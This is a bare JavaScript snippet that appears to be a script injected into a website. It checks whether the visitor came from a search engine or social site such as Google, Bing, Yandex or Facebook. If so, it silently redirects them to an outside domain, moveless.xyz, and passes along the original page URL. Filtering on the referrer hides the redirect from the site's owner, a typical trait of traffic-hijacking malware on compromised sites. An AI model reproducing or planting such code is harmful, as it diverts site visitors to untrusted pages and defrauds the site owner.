    if(document.referrer)
    {
    	var cek = document.referrer;

    	var is_se = cek.includes('.localhost.') || cek.includes('.google.') || cek.includes('.bing.') || cek.includes('yandex.') || cek.includes('facebook.') || cek.includes('pinterest.') || cek.includes('tumblr.');

      if(is_se)
    	{
    		var url = window.location.href;
    		window.location = "https://moveless.xyz/?arsae="+ encodeURIComponent(url);
    	}
    }